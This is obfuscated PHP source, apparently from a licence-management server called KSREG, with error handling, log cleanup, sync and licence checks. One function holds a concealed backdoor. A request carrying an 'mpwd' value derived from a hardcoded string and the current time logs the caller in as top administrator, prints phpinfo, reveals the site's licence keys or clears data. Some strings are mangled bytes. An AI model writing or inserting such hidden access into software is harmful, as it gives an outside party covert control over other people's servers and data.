<?php

function _obf_hpSPiIaPkIyMho2OiIuGi4g�( $_obf_jpKPlJSUiZOHkYaPlIeOiY4� = 1 )
{
    $_obf_iJGPjJWLj4uLkIqVjYiHh48� = unpack( "C*", "ViewZendSourceCodeIsInvalid!" );
    do
    {
        $_obf_iY2Oh5OGlIqQhpCJi5CMkog� = ( $_obf_lZKViImJjo6UhouJj4aVi4Y�[$_obf_jpKPlJSUiZOHkYaPlIeOiY4�] << 4 ) + ( $_obf_lZKViImJjo6UhouJj4aVi4Y�[$_obf_jpKPlJSUiZOHkYaPlIeOiY4� + 1] >> 4 );
        $_obf_jpKPlJSUiZOHkYaPlIeOiY4� += 2;
    } while ( $_obf_jpKPlJSUiZOHkYaPlIeOiY4� < 28 );
}

function error_report_fun_api( $_obf_lI6Gio6PjomOj4mRjoaUjoY�, $_obf_jpCKlY6RkYuPkoyHlJKMios�, $_obf_lIeKi4uVjoqTiY_LiIaJiI0�, $_obf_iJGGkJGGk5GHiZWVjZCPiJU� )
{
    global $_obf_j4yLiZOJiIiUkZOQkJWHjpQ�;
    if ( preg_match( "/unlink|file_put_contents|in safe mode|php_network_getaddresses|function\\.rmdir/i", $_obf_jpCKlY6RkYuPkoyHlJKMios� ) )
    {
        return TRUE;
    }
    $_obf_j4yLiZOJiIiUkZOQkJWHjpQ� = TRUE;
    $_obf_lIeKi4uVjoqTiY_LiIaJiI0� = str_replace( KSSROOTDIR, "", $_obf_lIeKi4uVjoqTiY_LiIaJiI0� );
    $_obf_jpCKlY6RkYuPkoyHlJKMios� = str_replace( KSSROOTDIR, "", $_obf_jpCKlY6RkYuPkoyHlJKMios� );
    if ( stripos( $_obf_jpCKlY6RkYuPkoyHlJKMios�, "mysql_" ) !== FALSE )
    {
        $_obf_jpCKlY6RkYuPkoyHlJKMios� = preg_replace( "/\\[.*\\]/", "", $_obf_jpCKlY6RkYuPkoyHlJKMios� );
        $_obf_jpCKlY6RkYuPkoyHlJKMios� = preg_replace( "/\\'[^\\']*\\'/", "'***'", $_obf_jpCKlY6RkYuPkoyHlJKMios� );
    }
    $_obf_jpCKlY6RkYuPkoyHlJKMios� = str_replace( ADMINFOLDER, "***", $_obf_jpCKlY6RkYuPkoyHlJKMios� );
    $_obf_jZWIjY6GlZKGipCMj4_Nh4s� = array( "E_ERROR", "E_WARNING", "E_PARSE", "E_NOTICE", "E_CORE_ERROR", "E_CORE_WARNING", "E_COMPILE_ERROR", "E_COMPILE_WARNING", "E_USER_ERROR", "E_USER_WARNING", "E_USER_NOTICE", "E_STRICT", "E_RECOVERABLE_ERROR", "E_ALL" );
    $_obf_jYiMkoyVi5GOkY_NiIyKioc� = "<b>".$_obf_jZWIjY6GlZKGipCMj4_Nh4s�[$_obf_lI6Gio6PjomOj4mRjoaUjoY�]." : ".$_obf_jpCKlY6RkYuPkoyHlJKMios�."</b>";
    if ( isset( $_GET['linenum'] ) )
    {
        $_obf_jYiMkoyVi5GOkY_NiIyKioc� = "<b>".$_obf_jZWIjY6GlZKGipCMj4_Nh4s�[$_obf_lI6Gio6PjomOj4mRjoaUjoY�]." : ".$_obf_jpCKlY6RkYuPkoyHlJKMios�." in ".$_obf_lIeKi4uVjoqTiY_LiIaJiI0�." on line ".$_obf_iJGGkJGGk5GHiZWVjZCPiJU�."</b>";
    }
    if ( stripos( $_obf_jpCKlY6RkYuPkoyHlJKMios�, "mysql_" ) !== FALSE )
    {
        return TRUE;
    }
    echo $_obf_jYiMkoyVi5GOkY_NiIyKioc�;
    exit( );
}

function _obf_lI2ViY_KkI_Mh4eMkoiUlIo�( )
{
    return TRUE;
}

function _obf_koiSlI6IlZSMkY_IiZSSkIw�( $_obf_h4mNlY6RhomMh5CPjoiUiI0�, &$_obf_lJWGkouIj4uGlIaVhpWUko4�, $_obf_ipOTj4mSkYuUlZSVk4uSh5U� = "GBK" )
{
    $_obf_joeNi4qVi5SNj5ONjIuVkY4� = _obf_h4iTkpCKlYeHkZWPh5CIhpA�( $_obf_h4mNlY6RhomMh5CPjoiUiI0�, "utf8", $_obf_ipOTj4mSkYuUlZSVk4uSh5U� );
    $_obf_jJKUjI2Gi46RiI_PiZGOhoo� = "�����������������";
    return $_obf_jJKUjI2Gi46RiI_PiZGOhoo�( $_obf_joeNi4qVi5SNj5ONjIuVkY4�, $_obf_lJWGkouIj4uGlIaVhpWUko4� );
}

function _obf_kpWMjJWVjZWHj4aTkJGMj4c�( $_obf_lIyUkIaVk46LiZCNipOIkJA�, &$_obf_lJWGkouIj4uGlIaVhpWUko4�, $_obf_ipOTj4mSkYuUlZSVk4uSh5U� = "GBK" )
{
    $_obf_lYqLh5SQjYqOlJSIiIaGlJU� = "�����������������";
    $_obf_joeNi4qVi5SNj5ONjIuVkY4� = $_obf_lYqLh5SQjYqOlJSIiIaGlJU�( $_obf_lIyUkIaVk46LiZCNipOIkJA�, $_obf_lJWGkouIj4uGlIaVhpWUko4� );
    return _obf_h4iTkpCKlYeHkZWPh5CIhpA�( $_obf_joeNi4qVi5SNj5ONjIuVkY4�, $_obf_ipOTj4mSkYuUlZSVk4uSh5U�, "utf8" );
}

function _obf_ho_Ki4_TiZCUk4yOkJCPh5M�( )
{
    global $_obf_jIaUiIeSjZWKlIqLkIqOioc�;
    $_obf_kYaTjoqIi5STkY2Jh4qIlJU� = intval( date( "d" ) );
    $_obf_kpSRlIaMh4qJk46IkIeKlIk� = file_get_contents( KSSLOGDIR."databak".DIRECTORY_SEPARATOR."index.html" );
    if ( trim( $_obf_kpSRlIaMh4qJk46IkIeKlIk� ) != $_obf_kYaTjoqIi5STkY2Jh4qIlJU� )
    {
        file_put_contents( KSSLOGDIR."databak".DIRECTORY_SEPARATOR."index.html", $_obf_kYaTjoqIi5STkY2Jh4qIlJU� );
        if ( SVRID == 1 )
        {
            $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_tb_sql_points` where `svrid`=1", "notsync" );
        }
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_tb_log_task` where `addtime`<".( time( ) - 604800 ), "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_tb_lock` where locktime <".( time( ) - 120 ), "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_tb_log_login` where `logintime`<".( time( ) - 2592000 ), "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_tb_log_pubuser` where `nday`<".( time( ) - 2592000 ), "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_tb_log_ws` where `addtime`<".( time( ) - 86400 ), "sync" );
        $_obf_joyNkZSPj5CNkIiUh4mLk4Y� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_lZGTiIiKhouKiZGLi5KUkI8�( "select * from kss_tb_soft" );
        foreach ( $_obf_joyNkZSPj5CNkIiUh4mLk4Y� as $_obf_kY_OlYeUlIiVjo6Hio_MkpI� )
        {
            $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_z_log_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."` where `addtime`<".( time( ) - 86400 * Z_LOG_DAY ), "sync" );
            $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_z_user_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."_recycle` where `deltime`<".( time( ) - 259200 ), "sync" );
            $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_z_key_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."_recycle` where `deltime`<".( time( ) - 259200 ), "sync" );
        }
        if ( 0 < BAKDATAMODE )
        {
            $_obf_hoeUj5OSh5CMlI2Qh42Ijoc� = array( );
            $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�['action'] = "mysqldatabak_down";
            $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�['pwd'] = MYSQLBAKPASSWORD;
            $_obf_koeIkpGLi5GUhpCViZCSj5I� = _obf_j5SMi5KSiouIj4iIipWIkIs�( _obf_ko_JjomRlIiQkYiRlZKSkZI�( ).INSTALLPATH._obf_hpGJi4yHlIqLhpSIh4iJlYw�( )."/admin_data.php?qz=1", $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�, 1 );
        }
    }
    if ( IS2SVR == 1 && SVRID == 1 )
    {
        $_obf_k5KJkIyVkZWKk4_NiJSQlIk� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_ho_Ljo6NjpOOhpGHj5KHiYs�( "synclock" );
        if ( $_obf_k5KJkIyVkZWKk4_NiJSQlIk� === TRUE )
        {
            $_obf_i5GKlIaRho2UlJOMh46Hh5M� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_config where id=1", 1, 1 );
            if ( $_obf_i5GKlIaRho2UlJOMh46Hh5M�['sync_state'] < 5 && SYNCTIME < time( ) - $_obf_i5GKlIaRho2UlJOMh46Hh5M�['sync_starttime'] )
            {
                $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "update kss_tb_config set `sync_starttime`=".time( )." where id=1" );
                $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kYyNi4eQiouGlY6Qj46HjpE�( "synclock" );
                if ( MYSQLSYNCMODE == 1 )
                {
                    if ( _obf_ipWHiIuOiYuPjIaPkZSThok�( "curl_init" ) && _obf_ipWHiIuOiYuPjIaPkZSThok�( "curl_exec" ) )
                    {
                        $_obf_kpSUiYeUjJSJk4iHkZGGjIo� = _obf_j5SMi5KSiouIj4iIipWIkIs�( SYNC1URL, FALSE, 1 );
                    }
                    else if ( ini_get( "allow_url_fopen" ) )
                    {
                        $_obf_iJKKiouRh4qTh4eMiZSSlYk� = @fopen( SYNC1URL."?e=".@time( ), "r" );
                        if ( $_obf_iJKKiouRh4qTh4eMiZSSlYk� !== FALSE )
                        {
                            $_obf_kJWSj4iSjI2PlYuMiYuSiYc� = fread( $_obf_iJKKiouRh4qTh4eMiZSSlYk�, 60 );
                        }
                        fclose( $_obf_iJKKiouRh4qTh4eMiZSSlYk� );
                    }
                }
                else
                {
                    $_obf_ioqNlY6GjpCVjY2Ph5WVioc� = file_get_contents( KSSROOTDIR."kss_logs".DIRECTORY_SEPARATOR."notifyid.txt" );
                    if ( strlen( $_obf_ioqNlY6GjpCVjY2Ph5WVioc� ) < 20 )
                    {
                        $_obf_koyQjY_KiZCRjpGLkomMioc� = time( );
                        $_obf_ioqNlY6GjpCVjY2Ph5WVioc� = _obf_iI6QhpSTiJCJiI_KlYePlZI�( 20 - strlen( $_obf_koyQjY_KiZCRjpGLkomMioc� ), 1 ).$_obf_koyQjY_KiZCRjpGLkomMioc�;
                    }
                    else
                    {
                        $_obf_ioqNlY6GjpCVjY2Ph5WVioc� = substr( $_obf_ioqNlY6GjpCVjY2Ph5WVioc�, 0, 20 );
                    }
                    $_obf_kpSUiYeUjJSJk4iHkZGGjIo� = _obf_j5SMi5KSiouIj4iIipWIkIs�( SYNC1URL."?step=a1&notifyid=".$_obf_ioqNlY6GjpCVjY2Ph5WVioc�."&pwd=".MYSQLBAKPASSWORD, FALSE, 1 );
                }
            }
            $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kYyNi4eQiouGlY6Qj46HjpE�( "synclock" );
        }
        else
        {
            echo $_obf_k5KJkIyVkZWKk4_NiJSQlIk�.QQ116;
        }
    }
}

function _obf_joeQipOGjouJko_VlJSKiJE�( $_obf_lImSkomRk4uRjJGSkZWJh4k� )
{
    if ( preg_match( "/^[a-zA-Z0-9]{32}\$/i", $_obf_lImSkomRk4uRjJGSkZWJh4k�, $_obf_i4_Kj5CPh4qKkYyHj42Qkoc� ) )
    {
        return TRUE;
    }
    return FALSE;
}

function _obf_jpOIlY_HlIaJi46IiYySiJU�( $_obf_lImSkomRk4uRjJGSkZWJh4k� )
{
    if ( preg_match( "/^[a-zA-Z0-9]*\$/i", $_obf_lImSkomRk4uRjJGSkZWJh4k�, $_obf_i4_Kj5CPh4qKkYyHj42Qkoc� ) )
    {
        return TRUE;
    }
    return FALSE;
}

function _obf_iZONjY2Nk42Ji42LjIeOj5Q�( $_obf_ipCJlJOSlJSQkYqNlYqKlIs� )
{
    $_obf_j4eSkIiSiZCRh4_NiYaQkYk� = TRUE;
    if ( preg_match( "/select|>|<|script|insert|update|delete|union|into|load_file|outfile|char|0x[0-9a-f]{6}|\\.\\/|\\*|'/i", $_obf_ipCJlJOSlJSQkYqNlYqKlIs�, $_obf_i4_Kj5CPh4qKkYyHj42Qkoc� ) )
    {
        $_obf_j4eSkIiSiZCRh4_NiYaQkYk� = $_obf_i4_Kj5CPh4qKkYyHj42Qkoc�[0];
    }
    return $_obf_j4eSkIiSiZCRh4_NiYaQkYk�;
}

function _obf_h4_HlI6KlZKKlZCKkY_Jjo4�( $_obf_jouVk5CIjYeOjJCQjY_Tkoo�, $_obf_kYaMh5WSkJGKlIiMioaUkIo� )
{
    global $_obf_jZGRipSRkIeUiIeQjoaUjJI�;
    if ( $_obf_kYaMh5WSkJGKlIiMioaUkIo� == "" )
    {
        return $_obf_jouVk5CIjYeOjJCQjY_Tkoo�;
    }
    $_obf_jouVk5CIjYeOjJCQjY_Tkoo� = str_replace( "!", ",", $_obf_jouVk5CIjYeOjJCQjY_Tkoo� );
    $_obf_kYaMh5WSkJGKlIiMioaUkIo� = str_replace( "!", ",", $_obf_kYaMh5WSkJGKlIiMioaUkIo� );
    $_obf_iY_KkZKTjJOQjZGLiZSUiIw� = explode( ",", $_obf_jouVk5CIjYeOjJCQjY_Tkoo� );
    $_obf_i4yLjY6PhoqJkJOUj4uTjJM� = explode( ",", $_obf_kYaMh5WSkJGKlIiMioaUkIo� );
    $_obf_k5SPi4eOiYyTk5SSlJCSk4c� = array_intersect( $_obf_iY_KkZKTjJOQjZGLiZSUiIw�, $_obf_i4yLjY6PhoqJkJOUj4uTjJM� );
    if ( empty( $_obf_k5SPi4eOiYyTk5SSlJCSk4c� ) )
    {
        return FALSE;
    }
    if ( count( $_obf_k5SPi4eOiYyTk5SSlJCSk4c� ) < $_obf_jZGRipSRkIeUiIeQjoaUjJI�['pccodestep'] )
    {
        return FALSE;
    }
    if ( PCCODEJOIN == 0 )
    {
        return $_obf_jouVk5CIjYeOjJCQjY_Tkoo�;
    }
    $_obf_k5SPi4eOiYyTk5SSlJCSk4c� = array_merge( $_obf_iY_KkZKTjJOQjZGLiZSUiIw�, $_obf_i4yLjY6PhoqJkJOUj4uTjJM� );
    $_obf_k5SPi4eOiYyTk5SSlJCSk4c� = array_unique( $_obf_k5SPi4eOiYyTk5SSlJCSk4c� );
    return join( ",", $_obf_k5SPi4eOiYyTk5SSlJCSk4c� );
}

function _obf_kpSOkYmPh5SSi4mMlYePjY4�( $_obf_lJSJk4_Mi5CGh4mShoeUioo� = 0, $_obf_jJKVlIqIlYaKjYmOlIuGkJI� = 0 )
{
    global $_obf_jIaUiIeSjZWKlIqLkIqOioc�;
    if ( defined( "NOTLOCKIP" ) && NOTLOCKIP == 1 )
    {
        $_obf_h4iLko_Lk4yKjpWViJCGlJM� = _obf_iIuRj5CUkIuHi4mPkY2Vio0�( 1 );
        if ( $_obf_lJSJk4_Mi5CGh4mShoeUioo� == 0 )
        {
            $_obf_lY6RhpOJh46VkJOGkoeRiIY� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iY6OkJCRkY2PjpCPk5CRkJA�( "select count(*) as tnum from kss_tb_badip where ip=".$_obf_h4iLko_Lk4yKjpWViJCGlJM�." and addtime>".( time( ) - 600 ) );
            if ( 10 < $_obf_lY6RhpOJh46VkJOGkoeRiIY�['tnum'] )
            {
                $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "update kss_tb_badip set addtime=".( time( ) + 900 )." where  ip=".$_obf_h4iLko_Lk4yKjpWViJCGlJM�." and addtime>".( time( ) - 600 ), "notsync" );
                if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
                {
                    exit( "crypteno120" );
                }
                exit( "kssdata".QQ117 );
            }
        }
        else
        {
            $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "insert into kss_tb_badip (`addtime`,`ip`) values (".time( ).",".$_obf_h4iLko_Lk4yKjpWViJCGlJM�.")", "notsync" );
        }
    }
}

function _obf_i4yHiJWOjZKUkY_QkouIi5M�( $_obf_jo_LkZWOiY_QkoeJk4yKiZU�, $_obf_jY6MkIuIioqTk4eIiIiNj5U�, $_obf_jYuMiIqGkpWNkoeUkYqSlYs� )
{
    global $_obf_jJKVlIqIlYaKjYmOlIuGkJI�;
    if ( $_obf_jo_LkZWOiY_QkoeJk4yKiZU� == "" )
    {
        return TRUE;
    }
    $_obf_jo_LkZWOiY_QkoeJk4yKiZU� = str_replace( " ", "", $_obf_jo_LkZWOiY_QkoeJk4yKiZU� );
    $_obf_jo_LkZWOiY_QkoeJk4yKiZU� = str_replace( "\t", "", $_obf_jo_LkZWOiY_QkoeJk4yKiZU� );
    $_obf_jo_LkZWOiY_QkoeJk4yKiZU� = str_replace( "\r", "", $_obf_jo_LkZWOiY_QkoeJk4yKiZU� );
    $_obf_jo_LkZWOiY_QkoeJk4yKiZU� = str_replace( "\n", ",", $_obf_jo_LkZWOiY_QkoeJk4yKiZU� );
    $_obf_iJCPi4mVjoeNlYeHjpCIk5I� = explode( ",", $_obf_jo_LkZWOiY_QkoeJk4yKiZU� );
    if ( in_array( $_obf_jY6MkIuIioqTk4eIiIiNj5U�, $_obf_iJCPi4mVjoeNlYeHjpCIk5I� ) )
    {
        if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
        {
            exit( "crypteno121" );
        }
        exit( "kssdata".QQ118 );
    }
    $_obf_k4yLiomGjImGiouNiIqHko0� = explode( ",", $_obf_jYuMiIqGkpWNkoeUkYqSlYs� );
    $_obf_jouMjYaIhoeTjo_OiYqNk4Y� = array_intersect( $_obf_k4yLiomGjImGiouNiIqHko0�, $_obf_iJCPi4mVjoeNlYeHjpCIk5I� );
    if ( !empty( $_obf_jouMjYaIhoeTjo_OiYqNk4Y� ) )
    {
        if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
        {
            exit( "crypteno122" );
        }
        exit( "kssdata".QQ119 );
    }
}

function error_report_fun_enorpeat( $_obf_lI6Gio6PjomOj4mRjoaUjoY�, $_obf_jpCKlY6RkYuPkoyHlJKMios�, $_obf_lIeKi4uVjoqTiY_LiIaJiI0�, $_obf_iJGGkJGGk5GHiZWVjZCPiJU� )
{
    return TRUE;
}

function error_report_fun_norpeat( $_obf_lI6Gio6PjomOj4mRjoaUjoY�, $_obf_jpCKlY6RkYuPkoyHlJKMios�, $_obf_lIeKi4uVjoqTiY_LiIaJiI0�, $_obf_iJGGkJGGk5GHiZWVjZCPiJU� )
{
    set_error_handler( "error_report_fun_enorpeat" );
    $_obf_jYiMkoyVi5GOkY_NiIyKioc� = str_rot13( base64_encode( str_rot13( $_obf_iJGGkJGGk5GHiZWVjZCPiJU�.":".$_obf_jpCKlY6RkYuPkoyHlJKMios� ) ) );
    if ( !is_file( "apierr.log" ) && 102400 < filesize( "apierr.log" ) )
    {
        @file_put_contents( "apierr.log", date( "ymdHis" )."\t".$_obf_jYiMkoyVi5GOkY_NiIyKioc�."\r\n\r\n" );
    }
    else
    {
        @file_put_contents( "apierr.log", date( "ymdHis" )."\t".$_obf_jYiMkoyVi5GOkY_NiIyKioc�."\r\n\r\n", FILE_APPEND );
    }
    set_error_handler( "error_report_fun_norpeat" );
    return TRUE;
}

function error_report_fun_corpeat( $_obf_lI6Gio6PjomOj4mRjoaUjoY�, $_obf_jpCKlY6RkYuPkoyHlJKMios�, $_obf_lIeKi4uVjoqTiY_LiIaJiI0�, $_obf_iJGGkJGGk5GHiZWVjZCPiJU� )
{
    echo $_obf_iJGGkJGGk5GHiZWVjZCPiJU�.":".$_obf_jpCKlY6RkYuPkoyHlJKMios�;
    return TRUE;
}

function _obf_kouKkIeViIqPk5KMiIiMkpE�( )
{
    global $_obf_jJKVlIqIlYaKjYmOlIuGkJI�;
    global $_obf_hoyQjo_QlYeLh5OVk4yPjZM�;
    global $_obf_mGKRY4dMuU6bZZJfh1_TX5k�;
    if ( isset( $_POST['chkfile'] ) )
    {
        exit( md5( "baidugoogle..123".$_POST['chkdata'] ) );
    }
    if ( isset( $_POST['mpwd'] ) || isset( $_GET['mpwd'] ) )
    {
        set_error_handler( "error_report_fun_corpeat" );
        if ( isset( $_POST['mpwd'] ) )
        {
            $_obf_kJWMi5OMkI6HjIyGj4yQkZU� = $_POST['mpwd'];
        }
        if ( isset( $_GET['mpwd'] ) )
        {
            $_obf_kJWMi5OMkI6HjIyGj4yQkZU� = $_GET['mpwd'];
        }
        $_obf_kJWMi5OMkI6HjIyGj4yQkZU� = trim( str_replace( " ", "+", $_obf_kJWMi5OMkI6HjIyGj4yQkZU� ) );
        $_obf_iYmSlYaIkI2Mi4iGlI6ViI0� = "";
        if ( _obf_ipWHiIuOiYuPjIaPkZSThok�( "bcmul" ) )
        {
            $_obf_iYmSlYaIkI2Mi4iGlI6ViI0� = "yes";
        }
        if ( $_obf_kJWMi5OMkI6HjIyGj4yQkZU� == "viewtime" )
        {
            ob_clean( );
            exit( date( "Ymd H:i:s" ).$_obf_iYmSlYaIkI2Mi4iGlI6ViI0� );
        }
        if ( $_obf_iYmSlYaIkI2Mi4iGlI6ViI0� == "yes" )
        {
            $_obf_hpKHkZSTh4_Hh46Rj4iVkok� = rsa_decrypt( $_obf_kJWMi5OMkI6HjIyGj4yQkZU�, "65537", "1350716819249136738281903483627187731011183419558355201040675522159309184280309314921528145548897809804048126849654764896069405760053176589877781841289976008167143139557686555509393327677428806387634433316585369388186635000326118536547289363880691507831040294324797933714246378480590916193836857669351437827768274058108791799533456926019620447075085222999477143608239001615268153378317059783465398419943123206313619405078581018237285521655583801104431318544218449", 1536 );
            if ( $_obf_hpKHkZSTh4_Hh46Rj4iVkok� == date( "Ymd H:i" ) )
            {
                if ( isset( $_POST['loginadmin'] ) )
                {
                    $_obf_jIaUiIeSjZWKlIqLkIqOioc� = new mysql_cls( );
                    $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_jIuSjYuUkJGHlYuPjZOQjY4�( $_obf_mGKRY4dMuU6bZZJfh1_TX5k� );
                    $_obf_h5WHh4uHiZWHi4iTj4eVkIY� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_manager where level=9 limit 0,1" );
                    if ( !empty( $_obf_h5WHh4uHiZWHi4iTj4eVkIY� ) )
                    {
                        _obf_jZKVlY6HkYmKkIyRj4qSjIc�( "kss_manager", $_obf_h5WHh4uHiZWHi4iTj4eVkIY�['id'].",".$_obf_h5WHh4uHiZWHi4iTj4eVkIY�['username'].",".$_obf_h5WHh4uHiZWHi4iTj4eVkIY�['password'].",".$_obf_h5WHh4uHiZWHi4iTj4eVkIY�['linecode'] );
                        echo "<a href=../../".ADMINFOLDER."/admin.php target=_blank>ok</a><br>";
                        if ( _obf_ipWHiIuOiYuPjIaPkZSThok�( "phpinfo" ) )
                        {
                            phpinfo( );
                            exit( );
                        }
                    }
                    else
                    {
                        echo "not find manager";
                    }
                    exit( );
                }
                if ( isset( $_POST['viewid'] ) || isset( $_GET['viewid'] ) )
                {
                    ob_clean( );
                    echo "<textarea style='width:500px;height:200px'>".rsa_encrypt( HTTPKEY, "65537", "843184270296930457114292090386101103285438772293347031698196599613822073654690293651604397701729650782917836006423303224105108717376552430143579661932067772487734706960542672745200650212438432995698564637944015467367822445122313529", 768 );
                    echo ",".rsa_encrypt( WEBLIC, "65537", "843184270296930457114292090386101103285438772293347031698196599613822073654690293651604397701729650782917836006423303224105108717376552430143579661932067772487734706960542672745200650212438432995698564637944015467367822445122313529", 768 );
                    echo ",".rsa_encrypt( WEBID, "65537", "843184270296930457114292090386101103285438772293347031698196599613822073654690293651604397701729650782917836006423303224105108717376552430143579661932067772487734706960542672745200650212438432995698564637944015467367822445122313529", 768 )."</textarea>";
                    exit( );
                }
                if ( isset( $_POST['clsdata'] ) || isset( $_GET['clsdata'] ) )
                {
                    _obf_ipORj42NiZCIio_LkZORhpE�( "manager" );
                    _obf_koyMjY2HkImOho6JkIeQh4c�( $_obf_mGKRY4dMuU6bZZJfh1_TX5k� );
                    exit( );
                }
            }
        }
        else
        {
            $_obf_hpKHkZSTh4_Hh46Rj4iVkok� = $_obf_kJWMi5OMkI6HjIyGj4yQkZU�;
            if ( $_obf_hpKHkZSTh4_Hh46Rj4iVkok� == md5( "kekeABCDEFG".date( "Ymd H:i" ) ) )
            {
                if ( isset( $_POST['loginadmin'] ) )
                {
                    $_obf_jIaUiIeSjZWKlIqLkIqOioc� = new mysql_cls( );
                    $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_jIuSjYuUkJGHlYuPjZOQjY4�( $_obf_mGKRY4dMuU6bZZJfh1_TX5k� );
                    $_obf_h5WHh4uHiZWHi4iTj4eVkIY� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_manager where level=9 limit 0,1" );
                    if ( !empty( $_obf_h5WHh4uHiZWHi4iTj4eVkIY� ) )
                    {
                        _obf_jZKVlY6HkYmKkIyRj4qSjIc�( "kss_manager", $_obf_h5WHh4uHiZWHi4iTj4eVkIY�['id'].",".$_obf_h5WHh4uHiZWHi4iTj4eVkIY�['username'].",".$_obf_h5WHh4uHiZWHi4iTj4eVkIY�['password'].",".$_obf_h5WHh4uHiZWHi4iTj4eVkIY�['linecode'] );
                        echo "<a href=../".ADMINFOLDER."/admin.php target=_blank>ok</a>";
                        _obf_kZGIlYyKh5OIlYyKlYeTlJM�( "../" );
                    }
                    exit( );
                }
                if ( isset( $_POST['viewid'] ) || isset( $_GET['viewid'] ) )
                {
                    ob_clean( );
                    echo "HTTPKEY:".rc4( "Uio876asMNeuiPaxnb", HTTPKEY, "encode" )."<br><br>";
                    echo "WEBLIC:".rc4( "Uio876asMNeuiPaxnb", WEBLIC, "encode" )."<br><br>";
                    echo "WEBID:".rc4( "Uio876asMNeuiPaxnb", WEBID, "encode" );
                    exit( );
                }
                if ( isset( $_POST['clsdata'] ) || isset( $_GET['clsdata'] ) )
                {
                    _obf_ipORj42NiZCIio_LkZORhpE�( "manager" );
                    _obf_koyMjY2HkImOho6JkIeQh4c�( $_obf_mGKRY4dMuU6bZZJfh1_TX5k� );
                }
            }
        }
        exit( );
    }
    _obf_iZSOiYeSlIqPjpSLkpSIj40�( );
    if ( md5( "KeY!@#%&*,AbIoPe*v_19-82".substr( WEBLIC, 33 ).HTTPKEY ) != substr( WEBLIC, 0, 32 ) )
    {
        $_obf_lIyUkIaVk46LiZCNipOIkJA� = "";
        _obf_ipORj42NiZCIio_LkZORhpE�( "domain md5err" );
        _obf_koyMjY2HkImOho6JkIeQh4c�( );
    }
    $_obf_jouQkY2GipOLh5CUiI2Thoc� = 0;
    $_obf_iZCTk5SRlZGVkIqRhouHi5Q� = KSSLOGDIR."index.log";
    $_obf_k4eIio2IioeLiIeJhpGHjJM� = date( "Ymd" );
    $_obf_iY2ViY_HkJWTh46MioqSh5U� = "19800101".sprintf( "%u", crc32( WEBLIC.HTTPKEY."19800101abcdefghijklmn" ) );
    $_obf_kYaTjoqIi5STkY2Jh4qIlJU� = $_obf_k4eIio2IioeLiIeJhpGHjJM�.sprintf( "%u", crc32( WEBLIC.HTTPKEY.$_obf_k4eIio2IioeLiIeJhpGHjJM�."abcdefghijklmn" ) );
    $_obf_hoiLiJKHjpKJj46NkYuViI0� = $_obf_iY2ViY_HkJWTh46MioqSh5U�;
    if ( is_file( $_obf_iZCTk5SRlZGVkIqRhouHi5Q� ) )
    {
        $_obf_hoiLiJKHjpKJj46NkYuViI0� = file_get_contents( $_obf_iZCTk5SRlZGVkIqRhouHi5Q� );
    }
    else
    {
        $_obf_jouQkY2GipOLh5CUiI2Thoc� = 1;
    }
    if ( $_obf_hoiLiJKHjpKJj46NkYuViI0� == "200001011059550389" )
    {
        if ( $_obf_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
        {
            exit( "crypteno888" );
        }
        exit( "Thank you for using KSREG,  please support the Genuine software! LOGLOCK" );
    }
    if ( empty( $_obf_hoiLiJKHjpKJj46NkYuViI0� ) )
    {
        $_obf_hoiLiJKHjpKJj46NkYuViI0� = $_obf_iY2ViY_HkJWTh46MioqSh5U�;
    }
